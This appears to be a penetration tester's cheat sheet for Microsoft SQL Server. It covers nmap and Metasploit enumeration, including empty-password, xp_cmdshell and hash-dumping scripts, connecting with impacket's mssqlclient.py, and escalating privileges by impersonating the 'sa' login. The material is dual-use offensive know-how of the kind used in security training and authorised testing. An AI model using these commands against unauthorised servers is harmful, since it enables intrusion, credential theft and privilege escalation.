
## Footprinting the Service

### Using NMAP

```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET IP>
```

### Using METASPLOIT

```bash
msfconsole
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <TARGET IP>
run
```

## Connect to MSSQL

```bash
python3 mssqlclient.py <username>@<TARGET IP> -windows-auth
```

**OR**

- If we use `sqlcmd` command then we need to use `GO` after every query.

```bash
sqlcmd -S <SERVER_NAME> -U <USERNAME> -P '<PASSWORD>' 
```



### Setup for mssqlclient.py

- To run the program we need to install the `impacket` library in python.
- Its always safer to do all of this is a safe virtual environment.

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
pip install .
```

### mssqlclient.py Location

- After the setup procedure the `mssqlclient.py` will be inside `impacket/examples/mssqlclient.py`.
- So move or copy that file into your current working directory and then run the command to connect to the MSSQL server.

## Impersonate Existing Users with MSSQL

### Identify Users that We Can Impersonate

- Identify the list of user/users you can impersonate.

```mysql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

### Verifying our Current User and Role

- Check your current database instance user and its role.

```mysql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

### Impersonating System Administrator(SA) User

- During identification of users we can impersonate we find that we can impersonate the `system administrator(SA)` user, we can use the below command to do that.

```mysql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```


## MSSQL Commands

| SQL Query                                           | Purpose                         |
| --------------------------------------------------- | ------------------------------- |
| `SELECT name FROM sys.databases;`                   | List all databases              |
| `SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;` | List tables in current database |
| `SELECT SYSTEM_USER;`                               | Check SQL login (server level)  |
| `SELECT USER_NAME();`                               | Check database user (DB level)  |
